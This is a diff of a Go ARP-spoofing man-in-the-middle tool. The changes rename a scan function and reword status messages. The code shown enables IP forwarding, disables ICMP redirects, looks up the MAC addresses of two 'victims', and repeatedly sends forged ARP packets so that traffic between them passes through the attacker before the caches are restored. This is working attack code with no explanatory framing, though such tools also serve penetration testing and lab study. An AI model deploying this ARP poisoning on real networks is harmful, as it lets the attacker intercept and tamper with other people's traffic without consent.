@@ -12,7 +12,7 @@ import (
 	"time"
 )
 
-func ARPScan(iface string, targetIP string) (string, error) {
+func ARPScanHost(iface string, targetIP string) (string, error) {
 	// Get MAC address of interface
 	srcMAC := utils.MacByInt(iface)
 	// Get IP address of interface
@@ -62,12 +62,14 @@ func ARPScan(iface string, targetIP string) (string, error) {
 }
 
 func enableIPForwarding(iface string) {
+	fmt.Println("[*] Enabling IP forwarding and disabling ICMP redirects...")
 	exec.Command("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward").Run()
 	exec.Command("sh", "-c", fmt.Sprintf("echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects", iface)).Run()
 	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects").Run()
 }
 
 func disableIPForwarding() {
+	fmt.Println("[*] Disabling IP forwarding...")
 	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward").Run()
 }
 
@@ -75,17 +77,13 @@ func ArpMitm(iface, victim1, victim2 string) {
 	enableIPForwarding(iface)
 	defer disableIPForwarding()
 
-	fmt.Println("[*] Enabled IP Forwarding")
-
 	ss, err := supersocket.NewSuperSocket(iface, "")
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	macVictim1, err := ARPScan(iface, victim1)
-	macVictim2, err := ARPScan(iface, victim2)
-
-	fmt.Println("[*] Got MAC of the victims")
+	macVictim1, err := ARPScanHost(iface, victim1)
+	macVictim2, err := ARPScanHost(iface, victim2)
 
 	intMac := utils.MacByInt(iface)
 	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2, intMac)
@@ -94,13 +92,11 @@ func ArpMitm(iface, victim1, victim2 string) {
 		ss.Send(arpPacket1)
 		time.Sleep(1 * time.Second)
 		ss.Send(arpPacket2)
-		fmt.Println("[*] Sending Fake ARPs")
-
 	}
-	fmt.Println("[*] Restoring original MAC")
+	fmt.Println("[*] Restoring targets...")
 
 	restoreArp(macVictim1, victim1, victim2, macVictim2, err, ss)
-
+	fmt.Println("[*] Shutting down...")
 }
 
 func restoreArp(macVictim1, victim1, victim2, macVictim2 string, err error, ss *supersocket.SuperSocket) {
